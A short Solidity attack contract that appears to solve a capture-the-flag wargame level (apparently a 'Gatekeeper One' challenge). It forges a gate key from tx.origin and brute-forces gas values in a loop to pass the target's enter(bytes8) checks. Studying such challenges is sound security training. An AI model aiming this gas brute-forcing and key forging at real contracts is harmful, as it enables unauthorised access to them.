pragma solidity ^0.4.18;

contract GateOneSkipper {
    bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function Skipper(address _param) public returns(bool){
        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 120; i++) {
            if (address(_param).call.gas(i + 150 + 8191 * 3)(bytes4(keccak256("enter(bytes8)")), _gateKey)) {
                return true;
            }
        }
    }
}